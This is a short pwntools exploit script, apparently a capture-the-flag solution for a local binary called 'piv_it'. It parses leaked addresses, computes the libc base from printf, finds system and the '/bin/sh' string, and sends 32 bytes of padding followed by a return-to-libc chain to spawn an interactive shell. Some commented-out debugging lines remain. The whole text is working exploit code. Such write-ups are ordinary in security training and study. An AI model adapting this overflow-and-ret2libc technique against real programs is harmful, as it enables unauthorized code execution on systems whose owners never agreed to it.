from pwn import *

p = process('./piv_it')
p.recvuntil("At: ")
ad = int(p.recv(10), 16)
log.info(hex(ad))
leak = ad
p.recvuntil('$')
p.sendline('')
p.recvuntil("At: ")
ad = int(p.recv(10), 16)
log.info(hex(ad))
p.recvuntil('$')
# p.sendline('')

# leak = ad
libc = ELF('./libc.so.6')
libc.address = leak - libc.symbols['printf']
system = libc.symbols['system']
log.info("system: " + hex(system))
binsh = libc.search("/bin/sh").next()

pause()
p.sendline(
        'A'*32+
        p32(system)+
        p32(0)+
        p32(binsh)
        )
p.interactive()

# p.sendline(cyclic(0x50))
# p.recvuntil('Errors')








# p.interactive()
